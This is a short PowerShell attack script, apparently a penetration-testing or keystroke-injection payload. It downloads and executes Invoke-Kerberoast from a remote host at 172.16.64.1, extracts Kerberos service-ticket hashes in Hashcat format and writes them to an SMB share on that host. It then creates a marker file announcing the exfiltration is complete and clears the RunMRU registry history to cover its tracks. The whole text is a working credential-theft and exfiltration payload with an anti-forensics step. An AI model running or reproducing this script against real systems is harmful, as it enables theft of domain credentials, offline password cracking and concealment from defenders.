IEX (New-Object Net.Webclient).DownloadString('http://172.16.64.1/Invoke-Kerberoast.ps1')
Invoke-Kerberoast -Outputformat Hashcat | fl > \\172.16.64.1\s\output.txt
New-Item -Path \\172.16.64.1\s -ItemType "file" -Name "EXFILTRATION_COMPLETE" -Value "EXFILTRATION_COMPLETE"
Remove-ItemProperty -Path 'HKCU:\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU' -Name '*' -ErrorAction SilentlyContinue
exit